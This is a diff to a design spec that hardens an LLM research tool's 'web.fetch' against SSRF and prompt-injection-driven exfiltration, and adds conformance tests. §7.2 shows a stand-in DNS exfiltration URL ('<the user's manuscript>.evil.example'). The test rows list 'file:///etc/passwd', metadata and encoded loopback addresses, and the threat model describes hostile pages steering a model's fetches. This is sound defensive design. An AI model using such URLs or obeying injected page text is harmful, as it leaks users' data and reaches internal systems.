@@ -17,7 +17,10 @@ byollm_016 §"Named future #2", byollm_013, byollm_004 §2.**
    for a service.
 2. **Three rows the stub's table did not have** (§7): the carrier-grade NAT
    range, ports 80 and 443 only, and the provenance rule for `web.fetch`.
-   Each one can be struck on its own without changing the rest.
+   Each one can be struck on its own without changing the rest. (§7 also
+   turns the table into an allow-list over IANA's special-purpose registries
+   and fixes the order of the checks, so that a refused URL is never looked
+   up. Those two follow from Owl's review and are not offered for striking.)
 3. **Each "beyond 012" section on its own**: B1 site-executed tools (Kevin's
    09-04 proposal), B2 tools on a teammate's device, B3 the self-scoped agent
    backend (B191). This spec recommends none of them for 0.1.5 and says why.
@@ -351,6 +354,28 @@ through Brave, only whether the slot can be served.
 This is the stub's table, extended. Every cell is a fact a check can
 assert, and §7.3 turns the table into checks.
 
+**For `web.fetch` the table is an allow-list written out, not a list of
+things to avoid.** An address may be fetched only if it is:
+
+- IPv4, outside every block in IANA's IPv4 Special-Purpose Address Registry
+  and outside multicast `224/4`; or
+- IPv6, inside global unicast `2000::/3` and outside every block in IANA's
+  IPv6 Special-Purpose Address Registry.
+
+Every block in those registries is refused, whether IANA marks it globally
+reachable or not, because none of them is where a web page lives. Two
+forms carry an IPv4 address inside an IPv6 one, and for those the embedded
+address is decoded and checked instead: IPv4-mapped (`::ffff:0:0/96`) and
+the well-known NAT64 prefix (`64:ff9b::/96`). On an IPv6-only network,
+NAT64 is how every public IPv4 site appears. Three forms embed an address
+but are refused outright rather than decoded: 6to4 (`2002::/16`, so
+`2002:7f00:1::` is loopback), Teredo (`2001::/32`) and local-use NAT64
+(`64:ff9b:1::/48`). The fetcher compiles both registries from a dated
+snapshot that the build card names. A later IANA addition is a new row and
+a new check, never a silent change. Each row below is one piece of that
+rule, so a row that goes missing shows up as a failing check, not as a gap
+in a list.
+
 | destination or request | model endpoint (`checkBaseUrl`, today) | `web.fetch` (proposed) |
 |---|---|---|
 | loopback (`127.0.0.0/8`, `::1`, `localhost`) | **allow**: Ollama's default lives here | **refuse** |
@@ -358,7 +383,10 @@ assert, and §7.3 turns the table into checks.
 | carrier-grade NAT (`100.64/10`) **(new row)** | allow, as owner config | **refuse** |
 | cloud metadata, link-local (`169.254/16`, `fe80::/10`, `metadata.google.internal`, `fd00:ec2::254`) | **refuse** | **refuse** |
 | unspecified, broadcast, multicast, reserved (`0/8`, `::`, `255.255.255.255`, `224/4`, `240/4`, `ff00::/8`) | **refuse** | **refuse** |
-| public internet | **allow**: `api.openai.com` is a legitimate backend | **allow** |
+| the registries' other blocks: IETF protocol assignments, documentation, benchmarking, the 6to4 relay, discard (`192.0.0/24`, `192.0.2/24`, `192.88.99/24`, `198.18/15`, `198.51.100/24`, `203.0.113/24`, `100::/64`, `2001::/23`, `2001:db8::/32`, `3fff::/20`) **(new row)** | as today (not changed here) | **refuse** |
+| embedded forms that are not decoded: 6to4, Teredo, local-use NAT64 (`2002::/16`, `2001::/32`, `64:ff9b:1::/48`) **(new row)** | as today (not changed here) | **refuse outright** |
+| IPv6 outside `2000::/3`, other than the two decoded forms **(new row)** | as today (not changed here) | **refuse** |
+| public internet, including a public IPv4 address behind `64:ff9b::/96` | **allow**: `api.openai.com` is a legitimate backend | **allow** |
 | scheme other than `http` / `https` | **refuse** | **refuse** |
 | credentials in the URL (`user:pass@`) | **refuse** | **refuse** |
 | port other than 80 / 443 **(new row)** | allow, as owner config | **refuse** |
@@ -403,9 +431,48 @@ metaphor (see the closing note).
   any page. The cost is that a model cannot guess a URL. It has to search
   first, which is how research works anyway.
 
-### 7.2 Three things an adversary-chosen URL brings
+### 7.2 The order of the checks, and three things an adversary-chosen URL brings
 
-These are carried from the stub, and none of them is optional.
+**The order is part of the policy.** A DNS lookup is itself a request that
+leaves the machine. It goes to the name's own nameserver, and the attacker
+may run that nameserver. A model told to fetch
+`https://<the user's manuscript>.evil.example/` would send the manuscript
+out through the lookup alone, even if the fetch were then refused. So the
+fetcher works in this order, and a refusal at any step ends the call there:
+
+1. Parse the URL and normalise it (item 3 below for addresses, and the
+   provenance comparison below for the rest).
+2. Run every check that can be decided from the string: scheme, userinfo,
+   port, provenance, and the address rule when the host is a literal
+   address. **Nothing has been looked up yet.**
+3. Write the call's ingress line (§9).
+4. Resolve the name, once.
+5. Check every address that came back (the mixed-answers row).
+6. Connect to the address that was checked (item 1 below).
+
+A name reaches step 4 only after it has passed provenance, so it already
+appeared in the job or in its search results. The lookup tells that
+nameserver nothing the job had not already shown it, and that is what
+makes §12's sentence about public websites true.
+
+**The provenance comparison.** Each URL the job has seen, and the URL the
+model asks for, is parsed with the WHATWG URL parser and reduced the same
+way before the two are compared:
+
+- scheme and host lowercased;
+- the host converted to ASCII (IDNA), with any trailing dot dropped;
+- an address host in its canonical form (item 3);
+- the scheme's default port dropped;
+- the fragment dropped.
+
+Path and query are compared exactly as the parser serialises them, with no
+further decoding. Nothing else is loosened: no prefix match, no same-host
+match, no reordering of query parameters, no treating `http` and `https`
+as the same, no case-folding of the path. A URL that differs from every
+seen one in anything else is unseen. The tool error tells the model to
+search for it.
+
+These three are carried from the stub, and none of them is optional.
 
 1. **DNS rebinding.** A name can resolve to a public address when it is
    checked and to `127.0.0.1` when the connection is made. So the fetcher
@@ -431,27 +498,37 @@ its own. The kit drives the reference daemon's fetcher through an injected
 resolver and an injected socket. Every refusal check asserts that **no
 connection was opened**, not only that an error came back. That is
 MUTATIONS.md's sequence rule: a fetcher that connected and then threw would
-pass an error-only assertion. The ids are proposals. The build cards assign
-the real ones after C032.
+pass an error-only assertion. Every check whose input can be decided from
+the string (a literal address, a scheme, userinfo, a port, provenance) also
+asserts that **no resolve happened**. A fetcher that looked the name up
+before refusing it would pass a connect-only assertion and still leak the
+name, so the inputs to C046–C048 and C053 are names, not literal addresses,
+and the mutation "run the string checks after the resolve" must fail each
+of them. The ids are proposals. C057–C065 are taken by byollm_021, so the
+rows added after Owl's review are C066–C068. The build cards assign the real
+ids after C032.
 
 | # | proposed id | inputs | passes when | mutation that must fail it |
 |---|---|---|---|---|
-| 1 | C040 fetch refuses loopback | `http://127.0.0.1/`, `http://127.9.9.9/`, `http://[::1]/`, `http://localhost/`, a name resolving to `127.0.0.1` | no connect; tool error | drop loopback from the refused ranges |
+| 1 | C040 fetch refuses loopback | `http://127.0.0.1/`, `http://127.9.9.9/`, `http://[::1]/`, `http://localhost/`, a name resolving to `127.0.0.1` | no connect; tool error; no resolve for the literal addresses | drop loopback from the refused ranges |
 | 2 | C041 fetch refuses the LAN | one address each in `10/8`, `172.16/12`, `192.168/16`, `fc00::/7` | no connect | drop the private ranges |
 | 3 | C042 fetch refuses CGNAT | `http://100.100.100.100/` | no connect | drop `100.64/10` |
 | 4 | C043 fetch refuses metadata | `169.254.169.254`, `fe80::1`, `metadata.google.internal`, `fd00:ec2::254` | no connect | drop link-local (the inverted-policy bug) |
 | 5 | C044 fetch refuses the unroutable | `0.0.0.0`, `[::]`, `255.255.255.255`, `224.0.0.1`, `240.0.0.1`, `[ff02::1]` | no connect | drop the reserved ranges |
-| 6 | C045 fetch allows the public internet | a public v4 and a public v6 address on 443, from a prior search | one connect, to that address | refuse everything (the positive control: without it, a fetcher that refuses all of these passes 1–5) |
-| 7 | C046 fetch refuses other schemes | `file:`, `ftp:`, `gopher:`, `data:`, `javascript:`, `ws:` | no connect | allow any scheme |
-| 8 | C047 fetch refuses credentials | `https://u:p@public.example/` | no connect | drop the userinfo check |
-| 9 | C048 fetch refuses other ports | public address on `:22`, `:6379`, `:8080` | no connect | allow any port |
+| 6 | C045 fetch allows the public internet | a public v4 address, a public v6 address, and `[64:ff9b::808:808]` (a public v4 address behind well-known NAT64), each on 443, from a prior search | one connect each, to that address | refuse everything (the positive control: without it, a fetcher that refuses all of these passes 1–5) |
+| 7 | C046 fetch refuses other schemes | `file:///etc/passwd`, then `ftp:`, `gopher:` and `ws:` URLs whose host is a name, plus `data:` and `javascript:` | no resolve; no connect | allow any scheme |
+| 8 | C047 fetch refuses credentials | `https://u:p@public.example/` | no resolve; no connect | drop the userinfo check |
+| 9 | C048 fetch refuses other ports | a public name on `:22`, `:6379`, `:8080` | no resolve; no connect | allow any port |
 | 10 | C049 fetch refuses redirects | public page answering 301, 302, 307, 308 | exactly one connect; tool error names the location | follow redirects |
 | 11 | C050 fetch pins resolution | a resolver that answers public, then `127.0.0.1` | exactly one resolve; the connect goes to the public address | resolve again at connect |
 | 12 | C051 fetch refuses mixed answers | a name resolving to `[public, 10.0.0.1]` | no connect | check only the first answer |
 | 13 | C052 fetch normalises encodings | each encoding in §7.2.3 | no connect for every one | check the string before normalising |
-| 14 | C053 fetch follows provenance | a URL in neither the input nor a search result | no connect; tool error says to search first | drop the provenance set |
+| 14 | C053 fetch follows provenance | (a) a URL whose host is a name, in neither the input nor a search result; (b) a seen URL with one query parameter added; (c) a seen `https://example.com/a?b=1` asked for as `HTTPS://Example.COM.:443/a?b=1#top` | (a) and (b): no resolve, no connect, tool error says to search first; (c): one connect | drop the provenance set (and, for (c), compare before normalising) |
 | 15 | C054 fetch sends nothing of the owner's | `HTTP_PROXY` set, a cookie jar present | request goes direct; no cookie, auth or proxy header | read the proxy env |
 | 16 | C055 fetch caps the body | a 10 MiB page | read stops at 2 MiB; connection closed; text cut at 50,000 characters | remove the cap |
+| 17 | C066 fetch refuses the registries' other blocks | one address in each block of that row | no resolve; no connect | drop the row |
+| 18 | C067 fetch refuses embedded forms it does not decode | `[2002:7f00:1::]`, `[2002:a00:1::]`, `[2001:0:4136:e378:8000:63bf:3fff:fdd2]`, `[64:ff9b:1::7f00:1]` | no resolve; no connect | drop the row (6to4 then passes, because `2002::/16` sits inside `2000::/3`) |
+| 19 | C068 fetch refuses IPv6 outside global unicast | `[4000::1]`, `[::102:304]` (IPv4-compatible, not decoded) | no resolve; no connect | allow any IPv6 address that is in no refused block |
 
 ## 8. Budgets
 
@@ -473,10 +550,19 @@ with `stop: "tool-budget"`, so the site can tell a short answer from a
 complete one. For `provider`, the stream watcher kills the child when it
 sees the call that goes over, and the job ends `ok` with the text so far if
 there is any, or as an error that says it ran out of lookups if there is
-none. The vendor may already have run that last search by the time the
-stream shows it, so **a `provider` job can make one call more than its
-budget**, and only one. That is the one place the two placements behave
-differently, and the difference is named rather than hidden.
+none. By the time the stream shows the call that goes over, the vendor may
+already have run it, and a single WebSearch call may run more than one
+query on the vendor's side. So **a `provider` job can exceed its budget by
+whatever the vendor ran before the stream showed the call that went over**.
+This spec does not assume that is one search. The build card adds a probe
+row (byollm_013) that runs a research job with `perJob: 1` against
+`claude-cli` and counts the searches the vendor reports in the result's
+usage. The daily ledger counts those reported searches, not stream events,
+wherever the stream carries them. If the probe finds that one call can run
+several queries, the consent line for `provider` counts calls ("up to 8
+lookups") and the docs say what a lookup can contain. That is the one place
+the two placements behave differently, and the difference is named rather
+than hidden.
 
 **Per site per day** is counted per (site, service) in the daemon's ledger.
 When it runs out, Research for that site is refused at admission for the
@@ -492,11 +578,13 @@ site's. (Kevin's proposal reverses this. See B1.)
 ## 9. Ingress logging
 
 `INGRESS_LOGGED_BEFORE_EXECUTION` grows a second clause: **every tool call
-is appended to the ingress log before it runs.** It is one line per call:
-job id, site, tool, the argument as given (the query, or the URL), and for
-a fetch the address it resolved to. When the call finishes, a second line
-records the outcome (ok, refused and by which row, timed out, cut short), the
-bytes read and, for a search, the result URLs.
+is appended to the ingress log before it runs.** For a fetch, "before it
+runs" means before the lookup (§7.2, step 3). It is one line per call: job
+id, site, tool, and the argument as given (the query, or the URL). When the
+call finishes, a second line records the outcome (ok, refused and by which
+row, timed out, cut short), for a fetch the address the name resolved to,
+the bytes read and, for a search, the result URLs. A call refused at step 2
+gets both lines and never resolves.
 
 - **For `provider`, the log holds what the vendor's stream reports**: each
   query and each result URL. What the vendor fetched on its own side is the
@@ -569,7 +657,8 @@ In words a person can weigh, which is the stub's "done when":
 
 > A hostile prompt, or a hostile page the model reads, can make your machine
 > run up to your per-job number of web searches and public-page reads for
-> that job, and spend the tokens to read them. It can send words from that
+> that job (through Claude, possibly a few more: see §8), and spend the
+> tokens to read them. It can send words from that
 > same job to your search provider in a search, and to a public website only
 > if that website's address already appeared in the job or in its search
 > results. It cannot reach anything on your network or your machine, cannot
@@ -593,9 +682,10 @@ spec's table.
 - **TOOL_FETCH_ADDRESS_POLICY**: §7's table. Daemon; conformance (§7.3) and
   adversarial (the hostile-page rows).
 - **TOOLS_BUDGETED**: §8's per-job and per-day limits, enforced before the
-  call that would exceed them, except that a `provider` job may overrun by
-  the one call its vendor ran before the stream showed it. Daemon;
-  conformance (check 6).
+  call that would exceed them. The exception is a `provider` job, which may
+  exceed them by whatever its vendor ran before the stream showed the call
+  that went over (§8, measured by a probe row). Daemon; conformance
+  (check 6).
 - **`INGRESS_LOGGED_BEFORE_EXECUTION`**, amended: each tool call is logged
   before it runs. Daemon; conformance (check 7).
 - **`OUTPUT_INERT`**, amended: §11's sentence.
@@ -608,7 +698,7 @@ spec's table.
 | 4 | C036 tools self-only: owner still served | Bob's own research job on the same daemon | runs | refuse every research job (the positive control) |
 | 5 | C037 tool menu closed | an echo backend that calls `shell`, then `web.fetch` with an extra key, then `web.search` with a 401-character query | three tool errors; no fetch, no search; three calls charged to the budget | let unknown names through |
 | 6 | C038 tool budget per job | an echo backend that calls `web.search` forever, `perJob: 3` | exactly 3 searches; a final turn with no tools; `ok` with `stop: "tool-budget"` | count after the call instead of before it |
-| 7 | C039 tool calls logged first | the fetcher asserts the log line exists at the moment it connects | every connect has its line already | log after the call |
+| 7 | C039 tool calls logged first | the resolver and the socket both assert that the call's log line exists at the moment they are used | every resolve and every connect has its line already | log after the call |
 | 8 | C056 sources only on research | a Chat and a Research job on the same service | `sources` and `toolCalls` present on the Research result only | add them to every result |
 
 ## 14. Done when
@@ -622,6 +712,8 @@ spec's table.
   mutation and a note that it was seen to fail.
 - The adversarial corpus has the research argv rows and the hostile-page
   rows, and a backend cannot gain a `provider` placement without them.
+- The byollm_013 probe row for `provider` search has run, and §8 and §10
+  state what it measured: how many searches one WebSearch call can run.
 - `docs/security.md` carries §12 word for word, and the address table.
 - The consent screen renders §10's lines from the service entry, and the
   kind-label table has "Research".
